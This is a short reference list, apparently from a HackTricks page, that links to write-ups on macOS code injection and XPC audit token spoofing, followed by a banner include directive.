- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
